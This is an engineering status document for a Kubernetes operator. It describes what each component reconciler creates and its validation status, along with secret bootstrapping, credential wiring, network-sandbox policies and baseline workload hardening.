# Component reconcilers

What the operator creates per component, and reconciler status. Update this as each
reconciler lands.

**Status summary.** All component reconcilers are implemented and validated on AKS: every
component (engine, control-plane Postgres, the four data stores, ingestion, workers, dashboard,
DISCO, IdP, demoSeed) reconciles into the right topology and owner-GCs on delete. The Cloudflare
DNS reconciler is implemented but not yet live-tested. Component images are built from source by
the bridge's [`build/images`](https://github.com/oramasearch/orama-cloud-v1-bridge/tree/main/build/images)
tooling and pushed to **private Docker Hub**; set `spec.images.tag` + `spec.images.pullSecretName`
([install §4](install.md#4-override-the-dummy-secrets--images-for-real-use)). Remaining `OramaCloudV1`
work is **hardening**: full config/secrets, HPA, Cloudflare LB, the workers-bundle in-cluster
wiring. The `Lake` CR is in production (`Lake/prod` on AKS); see the lake rows below.

| Component | Reconciler | Creates | Status |
|---|---|---|---|
| **engine** | `internal/controller/engine.go` | writer `StatefulSet` (PVC) on the primary; readers `Deployment` (+Envoy sidecar); **shared `embeddings` Deployment** (ai-server :50051, +GPU when `writer.gpu`); Services; engine `ConfigMap` | ✅ **done** (validated on AKS) |
| **dashboard** | `internal/controller/app.go` | `Deployment` + Service + `Ingress`; `db-migrate` init (Drizzle, [#34](https://github.com/oramasearch/orama-operator/issues/34)) runs **only for an external control DB** — when controlDB is in-cluster the operator's owned `PostgresSchema` applies the schema, and running both double-applies (Postgres `42710`, "type already exists") | ✅ **done** (validated on AKS) |
| **docs** | `internal/controller/app.go` | `Deployment` + Service + `Ingress` (docs.orama.com, Next.js + Fumadocs, `:3000`) | ✅ **done** |
| **ingestion** | `internal/controller/ingestion.go` | index-builder `Deployment` + HARVEST master + Mongo `StatefulSet` + Selenium | ✅ **done** (validated on AKS) |
| **controlDB** | `internal/controller/controldb.go` | CloudNativePG `Cluster` (primary bootstrap; read-tier replica); + an owned **`PostgresSchema`** applying the dashboard's Drizzle schema | ✅ **done** (validated on AKS); schema CRD 🟡 **implemented** ([#40](https://github.com/oramasearch/orama-operator/issues/40), supersedes the [#34](https://github.com/oramasearch/orama-operator/issues/34) Job) |
| **controldb-schema** | `internal/controller/postgresschema_controller.go` | owns an idempotent migration Job (wait → guard + every recorded `schema_migrations` row → apply-in-one-txn) from a `PostgresSchema` CRD, recording the applied version in `.status` (no finalizer — never drops data) | 🟡 **implemented** ([#40](https://github.com/oramasearch/orama-operator/issues/40); see [`datastore-crds.md`](datastore-crds.md)) |
| **analytics** | `internal/controller/datastore.go` | ClickHouse `StatefulSet` + Service (8123/9000) | ✅ **done** (validated on AKS) |
| **cache** | `internal/controller/datastore.go` | Redis `StatefulSet` + Service (6379) | ✅ **done** (validated on AKS) |
| **broker** | `internal/controller/datastore.go` | RabbitMQ `StatefulSet` + Service (5672/15672/5552), central placement; + an owned **`RabbitMQTopology`** (vhost/users/permissions/`oramacore-operations` stream) reconciled via the management API | ✅ **done** (validated on AKS); topology CRD 🟡 **implemented** ([#40](https://github.com/oramasearch/orama-operator/issues/40)/[#41](https://github.com/oramasearch/orama-operator/issues/41)) — see [`datastore-crds.md`](datastore-crds.md) |
| **broker-topology** | `internal/controller/rabbitmqtopology_controller.go` | reconciles the broker's vhosts/users/permissions/streams via its management HTTP API (:15672) from an owned `RabbitMQTopology` CRD (finalizer teardown); least-privilege per-service users + the `oramacore-operations` replication stream, declared with the **same `x-max-length-bytes` (5 GB) OramaCore uses** on its own stream-protocol Create — a mismatched/absent arg makes RabbitMQ 400 the redeclare and fails the whole reconcile before the users exist (the reader then can't auth) | ✅ **done** (validated on AKS) ([#40](https://github.com/oramasearch/orama-operator/issues/40)/[#41](https://github.com/oramasearch/orama-operator/issues/41)) |
| **search** | `internal/controller/datastore.go` | Typesense `StatefulSet` + Service (8108) | ✅ **done** (validated on AKS) |
| **disco** | `internal/controller/disco.go` | `Deployment` (DISCO + embeddings sidecar) + Service | ✅ **done** (validated on AKS) |
| **workers** | `internal/controller/app.go` | one bundled-image `Deployment` + Service | ✅ **done** (validated on AKS) |
| **analytics-processor** | `internal/controller/gaps.go` | `Deployment` + Service — pulls `/v1/analytics` → ClickHouse | 🟡 **modeled** ([#5](https://github.com/oramasearch/orama-operator/issues/5); image is a follow-up) |
| **oramasearch-app** | `internal/controller/gaps.go` | `Deployment` + Service + `Ingress` — api.askorama.ai (legacy) | 🟡 **modeled** ([#7](https://github.com/oramasearch/orama-operator/issues/7); image is a follow-up) |
| **search-workers** | `internal/controller/gaps.go` | 4 CF-worker `Deployment`s (index-shared / large-index / openai-decrypter / telemetry) | 🟡 **modeled** ([#6](https://github.com/oramasearch/orama-operator/issues/6); images + CF-binding wiring are a follow-up) |
| **cloudflare** | `internal/controller/cloudflare.go` | CF DNS record via the CF API (safe no-op until configured) | 🟡 **implemented** (not live-tested) |
| **cloudflare-lb** | `internal/controller/cloudflareloadbalancer_controller.go` | global **Load Balancer** + **Origin Pool(s)** + **Health Monitor** via the CF Load Balancing API, from an owned `CloudflareLoadBalancer` CRD (finalizer teardown) | 🟡 **implemented** ([#73](https://github.com/oramasearch/orama-operator/issues/73); not live-tested — needs LB enabled on the account; live-node origins are [#74](https://github.com/oramasearch/orama-operator/issues/74)) |
| **idp** (keycloak) | `internal/controller/idp.go` | Keycloak `Deployment` + Service (when `idp.provider=keycloak`) | ✅ **done** (validated on AKS) |
| **demoSeed** | `internal/controller/idp.go` | one-shot seed `Job` (placeholder) | ✅ **done** (validated on AKS) |
| **zetta-capacity** | `internal/controller/zetta_capacity.go` | Karpenter `NodePool` (unstructured, cluster-scoped) + a `PodDisruptionBudget`; pins the Zetta pods onto the pool (taint/toleration + nodeSelector + `do-not-disrupt`) | 🟡 **implemented** (opt-in, [#69](https://github.com/oramasearch/orama-operator/issues/69) first slice; not yet live-tested — needs an EKS/AKS-NAP cluster) |
| **zetta-capacity-install** | `internal/controller/zetta_capacity_install.go` | Operator-owned **Karpenter install** (cloud-gated): server-side-applies the pinned upstream controller (Deployment + ServiceAccount + RBAC) + Karpenter CRDs, as `unstructured` | 🟡 **implemented** (opt-in `install: true`, [#75](https://github.com/oramasearch/orama-operator/issues/75); EKS self-install, no-op on AKS-NAP/bare-metal; not yet live-tested) |
| **lake** (liquid project) | `internal/controller/lake_controller.go` | from one cluster-scoped `Lake` CR: Namespace, owned or referenced store PVC, hardened RWO-safe `Recreate` Deployment (pod `ndots:2`, as on agent and app pods, so full Service names resolve on the first query) + conditional PDB + Service, admin-token, instance-KEK and sealing-key Secrets, CNPG control-plane `Cluster` + owned `PostgresSchema` (lake's schema), owned `OramaZettaCluster` data plane, opt-in Barman R2/S3 `ScheduledBackup`, opt-in TLS Ingress + `CloudflareDNSRecord`, Lake-owned environments, and per-data-service lifecycle evidence | ✅ **done** (`Lake/prod` live on AKS; issue #122's rolling proof is superseded by the RWO-safe restart check; issue #125 live Zetta proof is deferred until this controller is deployed; data services remain unmanaged until their required rehearsals pass) — see [`lake/README.md`](lake/README.md), [`lake/backups.md`](lake/backups.md), [`lake/data-services/README.md`](lake/data-services/README.md), and [`lake/sealed-secrets.md`](lake/sealed-secrets.md) |
| **lake e2e** | `internal/controller/lakee2etest_controller.go` | from one cluster-scoped `LakeE2ETest`: waits for the target Lake, Postgres, and schema, then owns a runner Job in the Lake namespace with the in-cluster URL and unique run identity | 🟡 **implemented** ([#123](https://github.com/oramasearch/orama-operator/issues/123)); fake-client verified, real k0s run deferred — see [`lake/README.md`](lake/README.md#service-e2e) |
| **lake-environment** | `internal/controller/lakeenvironment_controller.go`, `internal/controller/zetta_deployments.go` | materializes append-only Zetta deployment events into stable Lake-owned `LakeEnvironment` CRs; each creates a PSS-restricted Namespace, default-deny and access NetworkPolicies, ResourceQuota, LimitRange, `untrusted` runtime Deployment, Service, sealed-secret copies with local LakeSealedSecret owners and derived Pod annotations, admission-selecting namespace labels, optional Ingress and named-environment DNS | 🟡 **implemented** ([#124](https://github.com/oramasearch/orama-operator/issues/124), [#142](https://github.com/oramasearch/orama-operator/issues/142)); fake-client, envtest and Zetta-double verified, real liquid→k0s change-page proof deferred — see [`lake/environments.md`](lake/environments.md) |
| **lake-app** | `internal/controller/lakeapp_controller.go`, `lakeapp_tokens.go` | isolated restricted workload, quota, limits, Deployment, Service and authenticated ingress; synchronized apps keep binding-derived network paths only before their workspace activates declared connections, then retain DNS and owning-Lake egress while `Connection` supplies workload paths; generated source/Zetta/event/registry-pull tokens, rollout gated on hash registration, a merged Docker config for Lake registry pulls, selected Secret keys copied and rendered as `secretKeyRef` environment entries, optional app.toml entrypoint, accurate stopped state and best-effort Lake events; one-release legacy whole-Secret `envFrom` delivery remains supported | 🟡 **implemented** (#193, #194, #221, #241, #468); native envtest covers lifecycle, bindings, secret environment delivery, token and pull-Secret rotation, pod references and namespace/DNS finalization; live app-runtime proof deferred — see [`lake/apps.md`](lake/apps.md) |
| **lake-apps-sync** | `internal/controller/lake_apps*.go`, `lake_services_notify.go` | opt-in control-Postgres apps rows to Lake-owned CRs in their workspace namespace, including the object-form `secret_env_refs` contract; generation-guarded status/hash writes, `lake_apps` listener and 60-second fallback, orphan removal, one proxied wildcard DNS record; the Lake pod receives `spec.apps.wildcard` as `LAKE_APPS_WILDCARD`; same-workspace Service connections use ID aliases alongside existing slug keys | 🟡 **implemented** (#194, #204, #221); fake Lake store with native envtest, native SQL contract fixture and DNS/listener tests; requires lake#293's migration and API at deployment — see [`lake/apps.md`](lake/apps.md) |
| **lake-workspaces** | `internal/controller/lake_workspaces*.go`, `lake_services_notify.go` | opt-in control-Postgres workspace rows to `<environment>-ws-<id>` namespaces; dedicated `lake_workspaces` listener and 60-second recovery list; restricted PSA, tokenless default ServiceAccount, per-plan ResourceQuota and LimitRange, default-deny plus explicit NetworkPolicies (including the per-kind datastore operator ingress and the CNPG/Strimzi/TiDB Kubernetes API egress, operator#268), local pull and Zetta credentials, exclusive ownership of the workspace Zetta, its volumes grown in place from lake's `storage_gi` (never shrunk; observed size, phase and message on the row, operator#259), comparison-gated workspace plus service status, stopped-data retention and namespace deletion; exact legacy Lake-namespace Zetta resources are logged and recreated fresh | 🟡 **implemented** (#190, #219, lake#265); fake-client lifecycle and policy tests, alternating-poll envtest and a native SQL fixture; live network proof uses `make verify-workspace-isolation` — see [`lake/workspaces.md`](lake/workspaces.md) |
| **lake-connections** | `internal/controller/lake_connections*.go`, `connection_controller.go`, `lake_services_notify.go` | after `network_guard`, polls Lake's `network_connections`, listens on `lake_network`, creates one workspace `Connection` per row, resolves app/service/agent identities and target Service ports, adds paired ingress/egress allowances to the workspace `NetworkSandbox`, writes comparison-gated `network_connection_status`, removes absent/orphan paths, and retires `allow-workspace-internal` only after every initial path is Ready | 🟡 **implemented** ([#468](https://github.com/oramasearch/orama-operator/issues/468)); fake-store/client policy and rollout coverage plus opt-in pgx contract coverage; named nonprod connectivity probe pending — see [`infrastructure/connections.md`](infrastructure/connections.md) |
| **tunnels** | `internal/controller/lake_tunnels*.go`, `tunnel_controller.go`, `zettatunnel_controller.go`, `zettatunnel_relay.go`, `cloudflaretunnel_controller.go`, `tunnel_pki.go`, `tunnel_shared.go` | after `network_guard` and Lake 0085, one Lake-controlled `Tunnel` per live grant; `ZettaTunnel` runs the per-grant zetta-tunnel endpoint, its generated `Connection` and relay-only allowance, and feeds the cluster's one relay (namespace `zetta-tunnel`, LoadBalancer 443, grants file and client-CA union, operator relay and workload CAs); `CloudflareTunnel` uses only a customer's own Cloudflare account (tunnel, CNAME, Access for one person, `cloudflared`); expiry/revocation tear down before `Expired`/`Revoked`; status returned to `network_tunnel_grant_status` | 🟡 **implemented** ([#471](https://github.com/oramasearch/orama-operator/issues/471)); fake-store/client, fake Cloudflare API and envtest coverage plus opt-in pgx contract coverage; live nonprod acceptance pending — see [`infrastructure/tunnels.md`](infrastructure/tunnels.md) |
| **peer-connections** | `internal/controller/lake_peers*.go`, `peerconnection_controller.go`, `peerlink_controller.go` | after `network_guard`, one Lake-controlled `PeerConnection` per `network_peers` row; per end a zetta-tunnel peer gateway (LoadBalancer 7446, projected `peer.json`), one Service per import and sandbox allowances limited to the named services; `PeerLink` on the managing cluster mints the pair's CA and certificates and writes each end's credentials on its cluster; absent withdraws Services and policies before the gateway; status to `network_peer_status` | 🟡 **implemented** ([#472](https://github.com/oramasearch/orama-operator/issues/472)); two-fake-cluster rehearsal, Lake intake, envtest CRD and opt-in pgx coverage; live two-cluster rehearsal pending — see [`infrastructure/peer-connections.md`](infrastructure/peer-connections.md) |
| **ingress-gateway** | `internal/controller/zettatunnel_ingress.go` | on every cluster: namespace `zetta-tunnel-ingress`, IngressClass `zetta-tunnel`, LoadBalancer 443, the zetta-tunnel ingress Deployment (zero replicas with nothing to serve), routes and certificates in one Secret, a report ConfigMap, its sandbox; serves every operator Ingress with a TLS Secret except Lake apps; addresses only fully served `zetta-tunnel` Ingresses; backends admit it beside ingress-nginx | 🟡 **implemented** ([#473](https://github.com/oramasearch/orama-operator/issues/473)); fake-client coverage; per-cluster cutover pending cert-manager (#457) — see [`infrastructure/ingress.md`](infrastructure/ingress.md) |
| **mesh** | `internal/controller/zettatunnel_mesh.go`, `internal/meshprojection/`, `cmd/mesh-projector/` | on every cluster: namespace `zetta-tunnel-mesh` (privileged), the agent DaemonSet (privileged zetta-tunnel agent + restricted projector), 16 template shard Secrets, the workload CA in the operator namespace; enrolled sandboxes render Connections on 15008 only and are projected after rendering, one identity and certificate per pod | 🟡 **implemented** ([#474](https://github.com/oramasearch/orama-operator/issues/474)); unit, fake-client and envtest coverage; live fail-closed proof pending, enrolment blocked on zetta-tunnel (probes, non-mesh peers) — see [`infrastructure/mesh.md`](infrastructure/mesh.md) |
| **lake-volume-snapshots** | `internal/controller/lake_volume_snapshots*.go`, `lake_services_notify.go` | opt-in (`spec.snapshots.enabled`) control-Postgres `volume_snapshot_policies` to CSI `VolumeSnapshot`s of lake's store claim and each workspace Zetta's claims: the `Retain` `VolumeSnapshotClass` created when absent, `<claim>-<UTC timestamp>` snapshots on the cron schedule, at first sight and on `requested_at`, pruning beyond `keep`, bound contents labelled with their target, comparison-gated `volume_snapshot_status`; deleted workspaces are left alone; dedicated `lake_volume_snapshots` listener and 60-second poll | 🟡 **implemented** (#260); envtests against the upstream snapshot CRDs and a native SQL fixture; a live snapshot and restore on dev are pending — see [`lake/volume-snapshots.md`](lake/volume-snapshots.md) |
| **lake builds** | `internal/controller/lake_builds.go`, `internal/controller/lake_builds_pgx.go`, `internal/controller/lake_services_notify.go` | with `Lake.spec.builds.enabled`: injects `LAKE_INTERNAL_URL` for Lake's registry authority, reads queued/cancelled `builds` rows from Lake control Postgres, creates one rootless BuildKit Job and scoped-token Secret in a deterministic per-space namespace, applies default-deny plus Lake/package-index egress, enforces per-Lake and per-space concurrency, sends pod-level progress events, parses the final digest/size from pod logs, and comparison-gates row updates; `LISTEN lake_builds` provides prompt wake-up while polling recovers missed notifications | 🟡 **implemented** ([#195](https://github.com/oramasearch/orama-operator/issues/195)); fake-client, native envtest, and pgx contract coverage; dev-cluster build-and-pull deferred until a published lake-builder image and matching Lake registry endpoints are available — see [`lake/builds.md`](lake/builds.md) |
| **lake managed services** | `internal/controller/lake_services.go`, `internal/controller/lake_services_pgx.go`, `internal/controller/lake_controller.go` | with `Lake.spec.services.enabled`: polls lake's `services` table over pgx at `spec.deploySync.interval`; owns Zetta, Postgres and catalog service resources, connection delivery, comparison-gated status, deletion and `spec.services.maxServices`, except that it skips the workspace-owned `zetta_service_id`. Workspace synchronization has its own switch, listener and quota. Catalog kinds use their upstream operators; SQLite, DuckDB and Polars use operator-owned wrappers | 🟡 **implemented** (liquid-bridge decisions 46 and 47; #219); fake-store/client, alternating-poll envtest and pgx coverage, selected live service proof, catalog-schema validation — see [`lake/services.md`](lake/services.md) |
| **lake methodology runs** | `internal/controller/lake_methodology_runs.go`, `internal/controller/lake_methodology_runs_pgx.go` | with `Lake.spec.builds.enabled` and `spec.methodologies.runtimeImage`: reads `methodology_runs` rows with their image build, waits for the build, then runs a stage, a sandbox and a collect Job sharing a per-run PVC in the restricted, default-deny namespace `lake-<name>-methodology-runs`; generates the run's `lmr.` credential (only its SHA-256 is written) and a pull Secret for the built image; the sandbox has no credential, token, service links or network unless granted (public internet only); writes phases, exit code and the sandbox's start and finish to `methodology_run_status` on change, the sandbox's resources to `workload_resources`, and removes the run's objects when it ends | 🟡 **implemented** ([#291](https://github.com/oramasearch/orama-operator/issues/291), [lake#655](https://github.com/oramasearch/lake/issues/655)); fake-client and pgx contract coverage; live run waits for lake#655 and the runtime image — see [`lake/methodology-runs.md`](lake/methodology-runs.md) |
| **lake workload resources** | `internal/controller/lake_workload_resources.go`, `internal/controller/lake_workload_resources_pgx.go` | on the control-rows poll, at most every 30 seconds per Lake: one `workload_resources` row in the Lake's control Postgres per workspace engine, managed service, app, build, agent launch and agent cron run (lake#658), holding the effective CPU and memory requests (request, else limit; init containers, sidecars and overhead as Kubernetes counts them), GPUs, GPU class (GPU feature discovery's product label, normalized) and VRAM of its scheduled pods; written only on change; a job's row is written from its Job as soon as the Job exists, a finished build or job keeps its values with `pods` 0, and a finished run with no row is backfilled from the pod spec the operator schedules it with (lake#658); rows of objects lake no longer has are deleted | 🟡 **implemented** ([lake#643](https://github.com/oramasearch/lake/issues/643), [lake#658](https://github.com/oramasearch/lake/issues/658)); fake-client and pgx contract coverage; a live run on dev waits for the lake side of lake#643 — see [`lake/workload-resources.md`](lake/workload-resources.md) |
| **lake Postgres rehearsals** | `internal/controller/lakerestorerehearsal_controller.go` | from one cluster-scoped `LakeRestoreRehearsal`: isolated CNPG backup recovery and data verification for restore; scratch image update then verification for upgrade; CNPG primary switchover then application-Secret connection verification for failover; terminal cleanup and Lake evidence update | ✅ **implemented** — see [`lake/data-services/postgres.md`](lake/data-services/postgres.md) |
| **lake sealed-secret delivery** | `internal/controller/lakesealedsecret_controller.go` | from one namespaced `LakeSealedSecret`: an owned, cluster-bound Kubernetes Secret labelled `lake.orama.cloud/sealed: "true"`; literal ciphertext opens locally, while lake and dynamic references call lake's mint capability with projected service-account attestation | 🟡 **implemented**; literal delivery and LakeEnvironment consumption with local delivery owners are complete and tested against both k0s admission policies, while lake/dynamic delivery awaits lake's `mint_sealed_secret` leaf |
| **deployment control plane** | `internal/controller/deployment_controlplane.go` | authenticated liquid REST `/v1` and MCP server; appends immutable Zetta history, desired events and audit entries, validates sealed-secret references, and reads reconciled `LakeEnvironment` status | ✅ **implemented** ([#142](https://github.com/oramasearch/orama-operator/issues/142)); REST/MCP, drift, Zetta-double and envtest coverage — see [`control-plane/README.md`](control-plane/README.md) |

## Bootstrap — config + per-component secrets (`internal/controller/config.go`)

Runs **first**. Makes the install self-bootstrapping (no manual secret pre-creation):

- **`<cr>-config` ConfigMap** (shared, non-sensitive) — service DNS for
  Postgres/ClickHouse/Redis/RabbitMQ/Typesense/DISCO/OramaCore, ports, Typesense +
  Keycloak non-secret config. Reconciled every pass.
- **Per-component secrets** `<cr>-<component>-secret` — each holds **only the dummy
  credentials that component needs** (`componentSecretData`). e.g. `search-secret` =
  `TYPESENSE_API_KEY`; `cache-secret` and `broker-secret` = empty (their passwords are generated,
  see [Credentials](#credentials--broker-and-redis-passwords-and-the-master-key-credentialsgo));
  `engine-secret` = the LLM keys (`GROQ_`, `OPENAI_`, `ANTHROPIC_`, `GOOGLE_API_KEY`) + `HF_TOKEN`;
  `dashboard-secret` = ClickHouse/JWT/Stripe (its **Postgres
  password comes from the CNPG `<cr>-controldb-app` secret**, not here — #32). No component Secret
  holds `MASTER_API_KEY`: every consumer reads `spec.masterAPIKeySecretRef`. **No shared blob** —
  a pod never sees a credential it doesn't use. **Create-if-absent** — the operator
  never overwrites an existing secret, so real / rotated values are
  preserved. Components with no secret needs (selenium, mongo) get none.

Each component consumes `envFrom: [<cr>-config, <cr>-<component>-secret]` (its own
secret only). Everything is owner-referenced → GC'd with the CR.

**Disable ≠ leave running ([#23](https://github.com/oramasearch/orama-operator/issues/23)).**
Owner-GC only fires on CR *deletion*; so when a `components.<x>.enabled` toggle flips off, the
reconciler actively **prunes** that component's owned resources by label
(`internal/controller/teardown.go` — `teardownByComponent`), covering Deployments/StatefulSets/
Services/ConfigMaps/Secrets/PDBs/Ingresses/Jobs (and the CNPG `Cluster` for `controlDB`). StatefulSet
PVCs are left behind (data preserved). Idempotent — `enable → disable → enable` round-trips cleanly
(validated on AKS: disabling `docs` pruned it, re-enabling restored it, `Ready 22/22`).

- **JWT keypair (real, generated)** — the operator generates a **real RSA-2048
  keypair** once (create-if-absent) into `<cr>-jwt` (private + public, for the
  **dashboard** to sign the OramaCore writer JWT) and `<cr>-jwt-pub` (public **only**,
  for the **engine** to verify). Least-privilege: the engine never receives the
  private key. Each stack generates its own pair; no other stack's keys are copied in. The
  pair is never rotated. When `<cr>-jwt-pub` is missing (an interrupted first run, or the Secret
  was deleted) the next reconcile recreates it from `<cr>-jwt`'s `JWT_PUBLIC_KEY` alone, with the
  same labels and owner; a signing Secret without that key fails the reconcile with a readable
  message and is left as it is. When two reconciles race to create `<cr>-jwt`, the loser derives
  the public Secret from the winner's pair. `JWT_ISSUER` is non-secret (in the ConfigMap):
  `jwtIssuer(oc)`, which is `spec.jwtIssuer`, or `orama-cloud` when that is empty, the same
  function the writer's JWT provider reads.

**Validated on AKS (2026-07-08):** per-component secrets are generated (the
`search-secret` holds only `TYPESENSE_API_KEY`, **not** the Cloudflare token); the
cache pod's `envFrom` is `[config, cache-secret]` only; Typesense + Keycloak boot
`1/1` off their scoped secrets.

> **Follow-ups:** edit the remaining dummy secret values in place for production
> (they're plain in-cluster K8s Secrets; the operator won't overwrite them). (The JWT
> keypair is already real + generated.)

## Credentials — broker and Redis passwords and the master key (`credentials.go`)

[#307](https://github.com/oramasearch/orama-operator/issues/307). Every client reads a stack-wide
credential from one Secret by `secretKeyRef`, so a value in that Secret is the value every component
connects with, and no value is in a ConfigMap, pod spec, annotation, status or log.

| Secret | Keys | Created by | Read by |
|---|---|---|---|
| `<cr>-broker-admin` | `username` (`orama`), `password` | the bootstrap step, where the broker runs locally | broker `rabbitmq.conf` and boot definitions, writer and reader transport config, harvest-master `AMQP_HOST`, `RabbitMQTopology` (`adminSecretRef`) |
| `<cr>-cache-auth` | `password` | the bootstrap step, where the cache runs locally | Redis `--requirepass`, harvest-master `REDIS_HOST`, index-builder `REDIS_URL` |
| `spec.masterAPIKeySecretRef` | `key`, default `MASTER_API_KEY` | supplied (the set's `secrets` list); never created or changed | writer render-config (`writer_side.master_api_key`; the reader-only config has none), analytics-processor render-config, index-builder, workers, dashboard, the e2e runner |

- **Generated once.** Where the store runs in this cluster (enabled, not `mode: external`, not
  `placement: central` on a read region) the operator creates the Secret with a random 48-character
  hex password, owner-referenced to the CR and labelled component `credentials`, which no teardown
  removes: disabling the broker or cache keeps its password for the retained volume. An existing
  Secret, generated or supplied, is never changed, adopted or filled in. A member whose store runs
  elsewhere receives the Secret through its set's `secrets` list.
- **Checked.** A broker or cache Secret missing a key, or holding an empty value or a character
  outside `A-Z a-z 0-9 - . _ ~` (the clients take it inside URLs and config files), fails the
  reconcile with `Ready=False` naming the Secret and key, and is left as it is.
- **Wiring.** Clients get `BROKER_USERNAME`, `BROKER_PASSWORD` and `REDIS_PASSWORD` as `secretKeyRef`
  entries placed before the URLs that reference them (`amqp://$(BROKER_USERNAME):$(BROKER_PASSWORD)@<cr>-broker:5672`,
  `redis://:$(REDIS_PASSWORD)@<cr>-cache:6379`), and Redis runs
  `redis-server --appendonly yes --requirepass $(REDIS_PASSWORD)`. Config files hold
  `__BROKER_USERNAME__`, `__BROKER_PASSWORD__` and `__MASTER_API_KEY__` placeholders that a
  `render-config` init container fills into an `emptyDir`.
- **Broker password on a retained volume.** RabbitMQ applies `default_user`/`default_pass` only to
  an empty data directory, so the broker also imports `/etc/rabbitmq/credentials.json` on every
  boot (`definitions.import_backend = local_filesystem`): the admin user, the `/` vhost and its
  permissions. Importing an existing user sets its password, so a changed `<cr>-broker-admin`
  takes effect when the broker rolls, without a reset or a volume deletion. Streams and per-service
  users stay with `RabbitMQTopology`.
- **The master key is required.** While the engine is enabled and the reference, its Secret or its
  key is missing, or the value is empty, starts with `dev-` or holds a line break, the writer and
  readers are not created, or are scaled to zero with their volumes kept, and `Ready=False` with
  phase `Degraded` names the cause (`MasterAPIKeyRefMissing`, `MasterAPIKeySecretMissing`,
  `MasterAPIKeyKeyMissing`, `MasterAPIKeyEmpty`, `MasterAPIKeyPlaceholder`, `MasterAPIKeyInvalid`)
  by namespace, Secret and key. The CR is checked again every 20 seconds and on every event of that
  Secret, and the configured replicas return once it is valid. The other consumers need only the
  reference's name to build their pods; without one they are not created or changed, and Ready
  reports `MasterAPIKeyRefMissing`. The value must equal the target control database's
  `oramacore_clusters.master_api_key`, which the dashboard reads; the operator does not write that
  row.
- **Automatic rolls.** Each workload that reads one of these Secrets carries
  `orama.cloud/credentials-hash`, the data hash of exactly the Secrets it reads (`secretDataHash`,
  shared with the LLM key hash). The controller maps every Secret event, owned or copied, to each CR
  in the namespace that reads it (`requestsForSecret`), so a changed value rolls only its consumers:
  `<cr>-broker-admin` the broker, writer, readers and harvest-master; `<cr>-cache-auth` the cache,
  harvest-master and index-builder; the master key the writer (and readers on the combined image),
  analytics-processor, index-builder, workers and dashboard. Metadata changes roll nothing. An
  existing e2e Job is immutable and keeps the reference it was created with.

## Network sandboxes (`internal/controller/networksandbox_controller.go`)

Zetta schema Jobs carry the owning Lake's sandbox selection label when present. Their existing
ownership and version-triggered replacement behavior is unchanged; adding selection labels does
not replace a current Job. `TestZettaControlPlaneReplacesStaleSchemaJob` retains its original fixture
and assertions, including replacement of an unowned stale Job.

`NetworkSandboxReconciler` turns one namespaced `NetworkSandbox` into a mandatory ingress-and-egress
`default-deny` NetworkPolicy, an owner-scoped `deny-cloud-metadata` CiliumNetworkPolicy for
`169.254.169.254/32`, `168.63.129.16/32` and `fd00:ec2::254/128`, and every explicitly named and
justified allowance in the resource. The Cilium deny is installed before allowances and cannot
be overridden by a declaration or another allow policy.
It adopts existing unowned policies with the declared names, owns the rendered objects, removes
stale owned policies, and refuses a name already controlled by another resource. Cilium v2 API and
dataplane support are required: both policy kinds are watched unconditionally for drift/deletion
repair. A missing Cilium API is an error, not an optional skip. Kubernetes garbage collection removes
the policies with their sandbox; terminating sandboxes do not recreate them. The controller reports
stable Ready status with policy counts (including the mandatory Cilium deny) and does not rewrite
unchanged status. AKS-managed Cilium's metadata path requires explicit deny because NetworkPolicy
`ipBlock` exclusions alone did not block it in the live 2026-10-14 proof.

Only the operator manager's ClusterRole may write `NetworkPolicy`, `CiliumNetworkPolicy` or
`NetworkSandbox`. The repository RBAC audit reads every Role and ClusterRole source, counts wildcard
rules, follows bindings and rejects any other policy writer. A native API-server test impersonates a
workspace default ServiceAccount, proves an allow-all policy is forbidden and checks create, update,
patch and delete for both workspace and tenant identities. Lake, app, agent and build identities
receive no policy-writer grant.

The Lake, Lake-workspaces and Orama Cloud v1 reconcilers each own one sandbox in every namespace
they manage and render it before workloads. Their complete policy inventory, public-address
exclusions, inferred paths and recovery behavior are in
[`infrastructure/network-sandbox.md`](infrastructure/network-sandbox.md). Every pre-existing
workspace policy name and spec is preserved across the ownership migration. Six separately named
Lake-only service-ingress policies pair with Lake's workspace egress on Postgres 5432, Kafka 9092,
ClickHouse 8123/9000, TiDB 4000, Cassandra 9042 and Valkey 6379. They select vendor pods only and
admit only the owning Lake's pod labels in its exact namespace, not the Orama operator. The
`LakeApp` access reconciler adds only the corresponding owning-Lake backend ingress on the app's
declared port. Before connection activation its binding egress remains; afterwards it keeps only
DNS and owning-Lake egress, and the `Connection` controller supplies declared workload paths through
sandbox-owned policies. Tests cover both isolated ends, other owners/unlabelled pods, port changes
and no-op reconciliation. Existing operator Zetta/HTTP and
datastore-operator management paths remain unchanged.

Cloud v1 writer and reader pods retain their replication stream, engine-owned embeddings, cluster
DNS and public-address paths. The public path permits any TCP port because customer JavaScript
hooks may call an arbitrary public URL, but both IPv4 and IPv6 blocks exclude private, link-local,
metadata, carrier-grade NAT, API-server, node-address and pod-CIDR destinations. The API, node and
pod exclusions are discovered from the cluster and retained across transient discovery failure.

## Workload hardening — applied to EVERY component ([#18](https://github.com/oramasearch/orama-operator/issues/18))

The engine used to be the only component wired with full probes/resources/grace/PDB; every other
workload got readiness-only and nothing else. The shared builders (`reconcileApp`,
`provisionStatefulSet`) and the engine now apply one **workload-hardening baseline** to every pod
the operator creates, so a component is run *well*, not just *running*. The helpers live in
`helpers.go` / `app.go` / `datastore.go`.

- **Health probes — startup + readiness + liveness.** The engine keeps its rich HTTP `GET /health`
  probes; every other container gets **TCP** probes on its primary port (`tcpStartup` /
  `tcpReadiness` / `tcpLiveness`). **Startup** (`30 × 10s` ≈ 5 min) gates the others so a slow boot
  (index-builder's ~29-var wiring, Keycloak `start-dev`, a store loading data) isn't killed;
  **readiness** gates Service routing; **liveness** (lenient — `20s` period) restarts a hung pod. TCP
  (not a guessed HTTP path) because a wrong liveness path would restart-loop a *healthy* pod.
- **Resource requests on every container + per-component memory limits.** `resourceReqs(memReq,
  cpuReq, memLimit)` puts CPU+memory **requests** on every container (the scheduler needs them) plus
  a **memory limit** — but **no CPU limit** (a CPU limit throttles rather than protects; the request
  suffices). Limits are sized **per component** (a blanket small one OOM-kills the heavy ones):
  light apps `512Mi`, dashboard/disco/keycloak/stores `~1Gi`, Selenium `1.5Gi`, ClickHouse `4Gi`
  (kept in lockstep with `clickhouseMemoryXML`), embeddings `4Gi`. The engine keeps its cgroup-aware
  `resourceCaps` (CPU limit included — tokio tolerates it). Every component's `resources` is
  **overridable on the CR** (`spec.components.<x>.resources`, `spec.idp.resources`,
  `spec.components.ingestion.resources`) — like the engine writer/reader already were.
